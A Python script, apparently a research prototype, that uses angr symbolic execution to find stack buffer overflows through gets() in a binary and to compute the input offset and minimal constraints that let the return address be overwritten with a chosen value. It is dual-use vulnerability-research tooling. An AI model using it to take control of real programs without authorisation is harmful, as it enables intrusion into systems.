import angr, argparse, sys, IPython
import claripy
import load_state
import struct

rip_pattern = 0xCCCCCCCC








class Bof_Aeg(object):
	def __init__(self, bin, base_addr):
		# virtual base address
		self.project = angr.Project(bin, main_opts={'base_addr': base_addr})
		self.num_input_chars = 256
		self.overflow = True
		self.vuln_addr = 0
		self.stdin_buf_addr = 0
		# Find the address of the `gets()` function in the binary
		gets_addr = self.project.loader.find_symbol("gets").rebased_addr
		# Hook the `gets()` function with the default SimProcedure implementation
		self.project.hook(gets_addr, angr.SIM_PROCEDURES['libc']['gets'])

	def is_unconstrained(self, m, constraints, start_addr):
		''' Use concretized input which satisfies constraints to check if it can exploit vulnerability '''
		
		# Generate concretized input with constraints #
		state = self.project.factory.entry_state()
		constraints = constraints[:m+1]
		for c in constraints:
			state.solver.add(c)
		if not state.solver.satisfiable():
			return False
		concretized_input = state.solver.eval(self.symbolic_input, cast_to=bytes)
		#trim 
		print(concretized_input)
		trim_index = 1
		while concretized_input[-trim_index]==0:
			trim_index += 1
		concretized_input = concretized_input[:-trim_index]

		print(concretized_input)
		#IPython.embed()

		# Check if it can find random address e.g. rip_pattern=0xcccccccc here #
		simfile = angr.SimFile('/dev/stdin', content=concretized_input)
		state = self.project.factory.call_state(addr=start_addr, stdin=simfile, add_options={ # currently must start from the start of func
			angr.options.CONSTRAINT_TRACKING_IN_SOLVER,
			angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
			angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS
			})
		simgr = self.project.factory.simgr(state)
		
		simgr.explore(find=rip_pattern)
		return len(simgr.found)>0


	def find_minimum_constraints(self, constraints, start_addr): 
		# Function to extract byte index from constraint name
		def get_byte_index(constraint):
		    # Parse the constraint name to extract the byte index
		    name = str(constraint)
		    start = name.index('[') + 1
		    end = name.index(':')
		    return -int(name[start:end])

		# Sort the constraints based on the byte index
		constraints = sorted(constraints, key=get_byte_index)
		# binary search
		n = len(constraints)
		l = 0
		r = n-1
		while l<r:
			m = (l+r)/2
			m = int(m)
			res = self.is_unconstrained(m, constraints, start_addr)
			if res:
				r = m-1
			else:
				l = m+1
		
		# drop 8 last bytes constraints cuz it is a specific random address
		if r>=8:
			r -= 8
		return constraints[:r+1]	


	def check_mem_corruption(self, simgr):
		print("active {}".format(simgr.active))
		if len(simgr.unconstrained):
			print("len of unconstrained {}".format(len(simgr.unconstrained)))
			for path in simgr.unconstrained:
				print("unconstrained {}".format(simgr.unconstrained))
				if path.satisfiable(extra_constraints=[path.regs.rip == rip_pattern]):
				#if path.regs.rip.symbolic:
					
					vuln_block = bof_aeg.project.factory.block(list(path.history.bbl_addrs)[-1])
					self.vuln_addr = vuln_block.addr + vuln_block.size - 1
					print("Vuln_addr: 0x%x"%self.vuln_addr)
					path.add_constraints(path.regs.rip == rip_pattern)
					if path.satisfiable():
						simgr.stashes['mem_corrupt'].append(path)
					simgr.stashes['unconstrained'].remove(path)
					simgr.drop(stash='active')
					print(path.regs.rip[0])
		return simgr

	def find_buf_overflow(self, start_addr, end_addr, regs, stack):
		#symsize = claripy.BVS('stdin_size', 64)
		
		symbolic_input = claripy.BVS('input', self.num_input_chars*8)
		self.symbolic_input = symbolic_input
		input_value = "\nhlkk"
		#arg_var = claripy.BVS('arg_var', 4*8)
		#input_value = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8b\xa5\x1c\xefG\xd8YD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
		simfile = angr.SimFile('/dev/stdin', content=symbolic_input)
		state = self.project.factory.call_state(addr=start_addr, stdin=simfile, add_options={
			angr.options.CONSTRAINT_TRACKING_IN_SOLVER,
			angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
			angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS
			})

		def log_func(s):
			print("[gets] rcx={}, rsp={}, rbp={}".format(hex(s.solver.eval(s.regs.rcx)), hex(s.solver.eval(s.regs.rsp)),  hex(s.solver.eval(s.regs.rbp))))
			self.stdin_buf_addr = s.solver.eval(s.regs.rcx)
			

		state.inspect.b('simprocedure', simprocedure_name='gets', when=angr.BP_BEFORE, action=log_func)
		#for char in symbolic_input.chop(bits=8):
		#	state.add_constraints(char >= 'A', char <= 'z')

		''' Setup concolic execution env '''
		load_state.set_regs(state, regs)
		load_state.set_stack(state, stack)
		print("sp is {}".format(state.regs.rsp))

		simgr = self.project.factory.simgr(state, save_unconstrained=True)
		simgr.stashes['mem_corrupt']  = []
		
		simgr.explore(step_func=self.check_mem_corruption, find=end_addr)
		print("corrupt {} len={}".format(simgr.stashes['mem_corrupt'], len(simgr.stashes['mem_corrupt'])))
	
		if len(simgr.stashes['mem_corrupt'])==0:
			self.overflow = False
			return 

		unconstrained_state = simgr.stashes['mem_corrupt'][-1]

		#input_bvv = claripy.BVV(input_value, len(input_value)*8)
		#input_bvv = input_bvv.zero_extend((num_input_chars-len(input_value))*8)
		stdin_constraints = unconstrained_state.solver.constraints

		minimum_constraints = self.find_minimum_constraints(stdin_constraints, start_addr)
		self.minimum_constraints = minimum_constraints

		unconstrained_state.solver.simplify()
		print("constraints = {}".format(minimum_constraints))
		#IPython.embed()

		# Solve for command-line argument that will let us set RBP and RIP
		solution = unconstrained_state.solver.eval(symbolic_input, cast_to=bytes)
		#print("Command-line arg to hijack rip:", solution)
		print("Hijacked-value to be placed at offset:", solution.index(rip_pattern.to_bytes(8, byteorder='little')))
		#print(rip_pattern)

		#stdin_buf = self.get_concrete_bytes()
		#self.satisfiable(minimum_constraints, stdin_buf)
		#self.satisfiable(minimum_constraints, "hello\n")
		#self.satisfiable(minimum_constraints, b'\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xcc\xcc\xcc\xcc\x00\x00\x00\x00')
		'''
		# Check if the test state satisfies the stdin constraints of the constrained state
		satisfiable = unconstrained_state.solver.satisfiable(extra_constraints=[symbolic_input==input_bvv])

		if satisfiable:
			print("The test string satisfies the stdin constraints.")
		else:
			print("The test string does not satisfy the stdin constraints.")
		'''

	def write_analysis(self):
		lines = [
			str(self.overflow) + '\n',
			hex(self.vuln_addr) + '\n',
			hex(self.stdin_buf_addr)
		]
		with open('analysis', 'w') as f:
			f.writelines(lines)
		if self.overflow:
			load_state.dump_constraints(self.minimum_constraints, "constraints")
			load_state.dump_symbolic_vars(self.symbolic_input, "symbolic_vars")

def main():
	
	'''parser = argparse.ArgumentParser()

	parser.add_argument("--bin", dest="bin")
	parser.add_argument("--start_addr", dest="start_addr")
	parser.add_argument("--end_addr", dest="end_addr")
	parser.add_argument("--regs", dest="regs")
	parser.add_argument("--stack", dest="stack")
	args = parser.parse_args()'''
	if len(sys.argv) != 7:
	  sys.exit("Not enough args")
	bin = str(sys.argv[1])
	regs = str(sys.argv[2])
	stack = str(sys.argv[3])
	start_addr = int(sys.argv[4], 16)
	end_addr = int(sys.argv[5], 16) 
	base_addr = int(sys.argv[6], 16)

	#p = angr.Project(args.bin)
	global bof_aeg
	bof_aeg = Bof_Aeg(bin, base_addr)
	bof_aeg.find_buf_overflow(start_addr, end_addr, regs, stack)

	bof_aeg.write_analysis()

	#IPython.embed()
	#print(simgr.mem_corrupt[0].addr)
	
if __name__ == "__main__":
	main()